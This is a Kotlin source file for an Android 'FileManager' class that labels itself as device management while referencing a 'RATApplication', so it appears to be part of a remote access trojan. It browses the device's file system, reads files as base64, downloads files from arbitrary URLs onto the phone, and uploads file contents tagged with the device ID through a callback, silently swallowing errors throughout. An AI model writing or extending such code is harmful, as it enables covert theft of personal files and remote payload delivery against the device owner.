package com.mycontrol.mdm.managers

import android.content.Context
import android.util.Base64
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class FileManager(private val context: Context) {

    fun listFiles(path: String): List<Map<String, Any?>> {
        val files = mutableListOf<Map<String, Any?>>()
        try {
            val dir = File(path)
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.forEach { f ->
                    files.add(mapOf(
                        "name" to f.name,
                        "path" to f.absolutePath,
                        "size" to f.length(),
                        "isDirectory" to f.isDirectory,
                        "lastModified" to f.lastModified(),
                        "permissions" to getPermissions(f)
                    ))
                }
            }
        } catch (e: Exception) {}
        return files.sortedByDescending { it["isDirectory"] as? Boolean }
    }

    fun readFile(path: String): String? {
        return try {
            val file = File(path)
            if (file.exists() && file.canRead() && file.length() < 10 * 1024 * 1024) {
                Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
            } else null
        } catch (e: Exception) { null }
    }

    fun downloadFile(url: String, destPath: String): Boolean {
        return try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = 15000
            conn.readTimeout = 30000
            val bytes = conn.inputStream.readBytes()
            val dest = File(destPath)
            if (!dest.exists()) dest.mkdirs()
            val outFile = File(dest, url.substringAfterLast("/"))
            outFile.writeBytes(bytes)
            true
        } catch (e: Exception) { false }
    }

    // ✅ ስህተት ተስተካከለ: Socket dependency ተነስቷል
    fun uploadFile(path: String, sendCallback: (String, Map<String, Any?>) -> Unit) {
        try {
            val file = File(path)
            if (file.exists() && file.canRead()) {
                sendCallback("file_upload", mapOf(
                    "deviceId" to com.mycontrol.mdm.RATApplication.deviceId,
                    "path" to path,
                    "name" to file.name,
                    "size" to file.length(),
                    "content" to Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
                ))
            }
        } catch (e: Exception) {}
    }

    private fun getPermissions(file: File): String {
        return buildString {
            append(if (file.canRead()) "r" else "-")
            append(if (file.canWrite()) "w" else "-")
            append(if (file.canExecute()) "x" else "-")
        }
    }
}
